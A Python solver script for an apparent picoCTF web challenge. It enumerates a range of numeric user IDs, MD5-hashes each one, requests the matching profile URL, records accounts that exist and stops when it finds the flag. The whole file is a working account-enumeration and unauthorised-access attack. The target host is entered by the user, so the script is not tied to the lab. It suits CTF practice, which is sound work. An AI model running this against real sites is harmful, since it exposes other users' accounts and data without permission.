import hashlib
import requests
import re
from pathlib import Path


URL = input("Enter the host: like \"http://crystal-peak.picoctf.net:60717/\": ")
BASE_URL = URL + "profile/user/{}"

START = int(input("Enter the start id: for example 2999: "))
END = int(input("Enter the end id: for example 3050: "))

if START > END:
    TEMP = START
    START = END
    END = TEMP

VALID_FILE = Path("valid_users.txt")
FLAG_FILE = Path("flag.txt")

session = requests.Session()

for user_id in range(START, END + 1):
    print(f"\r[{user_id}/{END}] Checking user {user_id}...", end="", flush=True)

    md5_hash = hashlib.md5(str(user_id).encode()).hexdigest()
    url = BASE_URL.format(md5_hash)

    try:
        response = session.get(url, timeout=5)
        text = response.text

    except requests.RequestException as e:
        print(f"\n[{user_id}/{END}] Error: {e}")
        continue

    if "user not found" not in text.lower():
        print()  # Move to a new line before printing results
        print(f"[+] Possible valid user: {user_id} ({md5_hash})")

        with VALID_FILE.open("a", encoding="utf-8") as f:
            f.write(f"{user_id},{md5_hash}\n")

    match = re.search(r"picoCTF\{.*?\}", text, re.IGNORECASE)

    if match:
        print()  # Move to a new line
        flag = match.group(0)
        print("=" * 60)
        print(f"[FLAG FOUND] {flag}")
        print("=" * 60)

        FLAG_FILE.write_text(flag, encoding="utf-8")
        break

print("\nDone.")